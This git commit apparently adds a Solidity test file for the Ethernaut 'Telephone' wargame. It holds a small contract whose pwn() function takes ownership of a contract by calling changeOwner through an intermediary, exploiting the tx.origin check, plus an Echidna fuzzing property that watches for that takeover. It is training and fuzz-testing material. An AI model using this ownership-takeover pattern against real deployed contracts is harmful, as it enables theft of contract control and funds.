94f537a62f37f04dcb95e88905a3242ebeb60a16
man715 <man715@webhack.localdomain>
2022-05-06 20:41:32 -0600

    vault backup: 2022-05-06 20:41:32

---
+++ ethernaut/04-Telephone/Test2.sol
@@ -0,0 +1,28 @@
+pragma solidity ^0.6.0;
+
+import './Telephone.sol';
+
+contract RingRing {
+  Test phone = Test(0x4242);
+  
+  function pwn() public {
+    phone.changeOwner(address(0x10000));
+  }
+}
+
+contract Test is Telephone {
+    RingRing ring;
+  constructor() Telephone() public payable {
+    // hint echidna
+    ring = new RingRing();
+  }
+
+
+    function echidna_test_origin() public returns (bool) {
+        if (tx.origin == owner) {
+            return false;
+        } else {
+            return true;
+        }
+    }    
+}
